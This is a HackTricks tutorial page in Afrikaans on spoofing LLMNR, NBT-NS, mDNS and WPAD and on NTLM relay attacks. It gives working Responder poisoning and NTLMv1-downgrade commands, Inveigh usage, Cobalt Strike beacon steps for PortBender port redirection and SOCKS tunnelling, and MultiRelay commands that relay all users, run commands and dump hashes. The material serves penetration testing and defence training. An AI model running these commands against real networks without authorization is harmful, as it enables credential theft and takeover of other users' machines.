# Spoofing LLMNR, NBT-NS, mDNS/DNS en WPAD en Relay-aanvalle

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Netwerkprotokolle

### Plaaslike Gasoplossingsprotokolle
- **LLMNR, NBT-NS, en mDNS**:
- Microsoft en ander bedryfstelsels gebruik LLMNR en NBT-NS vir plaaslike naamoplossing wanneer DNS misluk. Op soortgelyke wyse gebruik Apple- en Linux-stelsels mDNS.
- Hierdie protokolle is vatbaar vir onderskepping en vervalsing as gevolg van hul ongeauthentiseerde, uitsaai-aard oor UDP.
- [Responder](https://github.com/lgandx/Responder) kan gebruik word om dienste te impersoneer deur vervals reaksies na gasheer wat hierdie protokolle ondersoek, te stuur.
- Verdere inligting oor diensimpersonasie met behulp van Responder kan hier gevind word [hier](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Ontdekkingsprotokol (WPAD)
- WPAD maak dit vir webblaaier moontlik om proksi-instellings outomaties te ontdek.
- Ontdekking word fasiliteer via DHCP, DNS, of terugval na LLMNR en NBT-NS as DNS misluk.
- Responder kan WPAD-aanvalle outomatiseer deur kli√´nte na skadelike WPAD-bediener te rig.

### Responder vir Protokolvergiftiging
- **Responder** is 'n instrument wat gebruik word vir die vergiftiging van LLMNR, NBT-NS, en mDNS-navrae, selektief reageer op navraagtipes, wat hoofsaaklik op SMB-dienste teiken.
- Dit kom voorafge√Ønstalleer in Kali Linux, aanpasbaar by `/etc/responder/Responder.conf`.
- Responder wys opgevangde hase op die skerm en stoor dit in die `/usr/share/responder/logs`-gids.
- Dit ondersteun beide IPv4 en IPv6.
- Windows-weergawe van Responder is beskikbaar [hier](https://github.com/lgandx/Responder-Windows).

#### Uitvoering van Responder
- Om Responder met verstekinstellings uit te voer: `responder -I <Interface>`
- Vir meer aggressiewe deursnuffeling (met potensi√´le newe-effekte): `responder -I <Interface> -P -r -v`
- Tegnieke om NTLMv1-uitdagings/reaksies vir makliker kraak vas te vang: `responder -I <Interface> --lm --disable-ess`
- WPAD-impersonasie kan geaktiveer word met: `responder -I <Interface> --wpad`
- NetBIOS-navrae kan na die aanvaller se IP opgelos word, en 'n outentiseringsproksi kan opgestel word: `responder.py -I <interface> -Pv`

### DHCP-vergiftiging met Responder
- Die vervalsing van DHCP-reaksies kan 'n slagoffer se roetinligting permanent vergiftig, wat 'n meer heimlike alternatief vir ARP-vergiftiging bied.
- Dit vereis presiese kennis van die teiken-netwerk se konfigurasie.
- Uitvoering van die aanval: `./Responder.py -I eth0 -Pdv`
- Hierdie metode kan effektief NTLMv1/2-hase vasvang, maar dit vereis sorgvuldige hantering om netwerk-onderbreking te vermy.

### Vasvang van geloofsbriewe met Responder
- Responder sal dienste impersoneer deur die bogenoemde protokolle te gebruik, geloofsbriewe vasvang (gewoonlik NTLMv2-uitdaging/reaksie) wanneer 'n gebruiker probeer om teen die vervals dienste te outentiseer.
- Pogings kan aangewend word om af te gradeer na NetNTLMv1 of ESS te deaktiveer vir makliker geloofsbriewe-kraak.

Dit is noodsaaklik om daarop te let dat die gebruik van hierdie tegnieke wettig en eties gedoen moet word, met behoorlike magtiging en om ontwrigting of ongemagtigde toegang te vermy.

## Inveigh

Inveigh is 'n instrument vir penetrasietoetsers en rooi spanne, ontwerp vir Windows-stelsels. Dit bied funksionaliteite soortgelyk aan Responder, wat vergiftiging en man-in-die-middel-aanvalle uitvoer. Die instrument het ge√´volueer vanaf 'n PowerShell-skrip na 'n C# bin√™re, met [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) en [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) as die hoofweergawes. Gedetailleerde parameters en instruksies kan gevind word in die [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh kan bedryf word deur PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Of uitgevoer as 'n C# bin√™re l√™er:
```bash
Inveigh.exe
```
### NTLM Relay Aanval

Hierdie aanval maak gebruik van SMB-verifikasiesessies om toegang tot 'n teikengreep te verkry, wat 'n stelselshell verleen indien suksesvol. Belangrike voorvereistes sluit in:
- Die verifiserende gebruiker moet plaaslike administrateurtoegang op die gerelayde gasheer h√™.
- SMB-ondertekening moet gedeaktiveer wees.

#### 445 Poort Deurvorsing en Tonnelering

In scenario's waar direkte netwerkintroduksie nie uitvoerbaar is nie, moet verkeer op poort 445 deurgevoer en getonnel word. Gereedskap soos [**PortBender**](https://github.com/praetorian-inc/PortBender) help om poort 445-verkeer na 'n ander poort om te lei, wat noodsaaklik is wanneer plaaslike administrateurtoegang beskikbaar is vir drywerbelading.

PortBender-opstelling en -werking in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Ander gereedskap vir NTLM Relay-aanval

- **Metasploit**: Stel op met proksies, plaaslike en afgele√´ gasheerbesonderhede.
- **smbrelayx**: 'n Python-skrip vir die relaying van SMB-sessies en die uitvoering van bevele of die implementering van agterdeure.
- **MultiRelay**: 'n instrument uit die Responder-pakket om spesifieke gebruikers of alle gebruikers te relay, bevele uit te voer, of hase te dump.

Elke gereedskap kan gekonfigureer word om deur 'n SOCKS-proksi te werk indien nodig, wat aanvalle selfs met indirekte netwerktoegang moontlik maak.

### MultiRelay-bedryf

MultiRelay word uitgevoer vanaf die _**/usr/share/responder/tools**_ gids, wat spesifieke IP-adresse of gebruikers teiken.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Dwang NTLM Aanmeldings

In Windows **kan jy dalk sommige bevoorregte rekeninge dwing om aan te meld by willekeurige masjiene**. Lees die volgende bladsy om te leer hoe:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Verwysings
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
